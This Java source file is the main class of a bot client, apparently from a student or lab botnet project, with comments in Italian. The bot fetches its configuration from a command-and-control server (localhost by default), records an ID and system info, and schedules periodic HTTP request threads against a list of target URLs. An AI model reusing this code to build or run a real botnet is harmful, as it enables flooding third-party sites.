package control.client;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Properties;
import java.util.Timer;
import control.Config;
import control.Utility;
import control.server.ProgramLog;
import model.SortMode;
import model.SystemInfoEntry;
import model.URLEntry;
import model.gui.URLEntryProperty;

/**
 * La classe Bot è la classe principale del bot. Il suo compito è quello di 
 * leggere o richiedere al server C&C il file di configurazione e di avviare i thread 
 * che poi effettueranno le richieste HTTP
 *
 */
public class Bot {
	
	private String botId;
	private Config config;
	private Log log;
	private SystemInfoBot systemInfoBot;
	private ProgramLog programLog;	
	private Properties properties;	
	private SortMode sortMode;
	private SocketBotThread socketBotThread;
	private Timer timer;
	private ArrayList<ContactThread> contactThreadList;
	private Path prjDirPath, dataDirPath, configFilePath, logFilePath, sysInfoFilePath, propertiesFilePath;		
	
	public Bot() {
	}
	
	public String getBotId() {
		return botId;
	}
	
	public Config getConfig() {
		return config;
	}
	
	public String getId() {
		return botId;
	}
	
	public void setId(String id) {
		this.botId = id;
	}
	
	public ArrayList<URLEntry> getContactsList() {
		return config.getContactsList();
	}
	
	/**
	 * Set contact list and save configuration file
	 * */
	public void setContactsList(ArrayList<URLEntry> contactsList) {
		config.setContactsList(contactsList);
		config.writeFile();
	}

	public ArrayList<SystemInfoEntry> getSystemInfoEntryList() {
		return systemInfoBot.getSystemInfoEntryList();
	}
	
	/**
	 * Inizializzazione del Bot
	 */
	public void init() {

		initPaths();
		properties = readPropertyFile(propertiesFilePath);
		sortMode = getSortMode(properties.getProperty("sortMode","NONE"));
		
		config = new Config(configFilePath);
		log = new Log(logFilePath);
		programLog = ProgramLog.getProgramLog();
		systemInfoBot = new SystemInfoBot(sysInfoFilePath);

		botId = Utility.generateID(sortMode);
		
		config.openOrCreateConfigFile();
		config.readFile();
			
		log.openOrCreateLogFile();
		programLog.addInfo("Program Started");

		systemInfoBot.overwriteSystemInfoFile();
		systemInfoBot.writeSystemInfoFile(botId);

		/*Se il file di configurazione è scaduto oppure è vuoto 
		 * il bot richiede un nuovo file di configurazione al server*/
		if(config.getContactsList().size()==0 || config.getConfigHeader().getTtl().intValue() == 0){
			socketBotThread = new SocketBotThread(properties.getProperty("serverAddress"));
			socketBotThread.start();
			synchronized (socketBotThread) {
				try {
					socketBotThread.wait();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
		}
		
		if(config.getConfigHeader().decreaseTtl()){
			config.writeFile();
		}
	}

	/**
	 * Il metodo crea un thread periodico per ogni URL presente nel file di configurazione
	 */
	public void start() {
		contactThreadList = new ArrayList<ContactThread>();
		timer = new Timer();
		int tryAgainSeconds = Integer.parseInt(properties.getProperty("tryAgainSeconds","30"));
		int proxyPort = Integer.parseInt(properties.getProperty("proxyPort","80"));
		
		for (int i = 0; i < config.getContactsList().size(); i++) {
			ContactThread cThread = new ContactThread(config.getContactsList().get(i), timer, tryAgainSeconds, proxyPort);
			contactThreadList.add(cThread);
			timer.schedule(cThread, 0);
		}
	}
	
	/**
	 * Interruzione dell'invio delle richieste.
	 * Non usato
	 */
	public void stop() {
		timer.cancel();
		for (int i = 0; i < contactThreadList.size(); i++) {
			contactThreadList.get(i).setContactNumber(0);
		}
	}
	
	private SortMode getSortMode(String sortModeString) {
		if(sortModeString.equalsIgnoreCase("NONE")){
			return SortMode.NONE;
		}else if(sortModeString.equalsIgnoreCase("RANDOM")){
			return SortMode.RANDOM;			
		}else if (sortModeString.equalsIgnoreCase("ASCENDING")){
			return SortMode.ASCENDING;			
		}else{
			return SortMode.NONE;
		}
	}

	/**
	 * Inizializzazione dei percorsi
	 */
	private void initPaths() {
		prjDirPath = Paths.get(System.getProperty("user.dir"));

		dataDirPath = prjDirPath.resolve("byobv1data");
		
		File dataDir = new File(dataDirPath.toString());
		dataDir.mkdir();
		
		configFilePath = dataDirPath.resolve("bot_config.txt");
		logFilePath = dataDirPath.resolve("bot_log.txt");
		sysInfoFilePath = dataDirPath.resolve("bot_sysinfo.txt");
		propertiesFilePath = dataDirPath.resolve("bot.properties");		
}


	/**
	 * Lettura del file di configurazione byobv1.properties contenente 
	 * parametri necessari per il funzionamento del programma come ad esempio
	 * l'indirizzo del serverC&C
	 * 
	 * @param propertiesFilePath percorso del file di configurazione interno
	 */
	private Properties readPropertyFile(Path propertiesFilePath) {		
		Properties returnValue;
		returnValue = new Properties();
		
		File propertiesFile = new File(propertiesFilePath.toString());	
		try {
			if(propertiesFile.createNewFile()){
				Charset charset = Charset.forName("ISO-8859-1");
				try (BufferedWriter writer = Files.newBufferedWriter(propertiesFilePath, charset)) {
					writer.write("#Address of C&C Server\n"
							   + "serverAddress=localhost\n\n"
							   + "#MAC address sorting mode for ID generation (NONE,RANDOM,ASCENDING)\n"
							   + "sortMode=ASCENDING\n\n"
							   + "#Seconds between consecutive attempts in case of sleeping bot\n"
							   + "tryAgainSeconds=10\n\n"
							   + "#Server Proxy Port\n"
							   + "proxyPort=80");	
					writer.close();
				} catch (IOException x) {
				    System.err.format("IOException: %s%n", x);
				}

			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		InputStream inputStream = null;
		try {
			inputStream = new FileInputStream(propertiesFilePath.toString());
		} catch (FileNotFoundException e1) {
			e1.printStackTrace();
		}
		
		try {
			returnValue.load(inputStream);
			inputStream.close();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (NullPointerException e) {
			e.printStackTrace();
		}
		return returnValue;
	}

	/**
	 * Il metodo close() si occupa di scrivere il file di configurazione
	 * e di cancellare l'esecuzione dei thread periodici
	 */
	public void close() {
		config.writeFile();

		try {
			timer.cancel();	
		} catch (NullPointerException e) {
			
		}
	}

	public ArrayList<URLEntryProperty> getContactsListProperty() {
		ArrayList<URLEntryProperty> returnValue = new ArrayList<URLEntryProperty>();
		
		for (int i = 0; i < config.getContactsList().size(); i++) {
			returnValue.add(new URLEntryProperty(config.getContactsList().get(i)));
		}

		return returnValue;
	}

	public URLEntry addContact(URLEntry newUrlEntry) {
		int lastContactId = 0;
		if(!config.getContactsList().isEmpty()){
			lastContactId = config.getContactsList().get(config.getContactsList().size()-1).getID();
		}
		newUrlEntry.setID(lastContactId+1);
		config.getContactsList().add(newUrlEntry);
		return newUrlEntry;
	}

	public void removeContact(Integer id) {
		for (int i = 0; i < config.getContactsList().size(); i++) {
			if(config.getContactsList().get(i).getID().equals(id)){
				config.getContactsList().remove(i);
			}
		}
	}

	public void editContact(URLEntry newUrlEntry) {
		int i;
		for (i = 0; i < config.getContactsList().size(); i++) {
			if(config.getContactsList().get(i).getID()==newUrlEntry.getID()){
				break;
			}
		}
		config.getContactsList().set(i, newUrlEntry);
	}
}
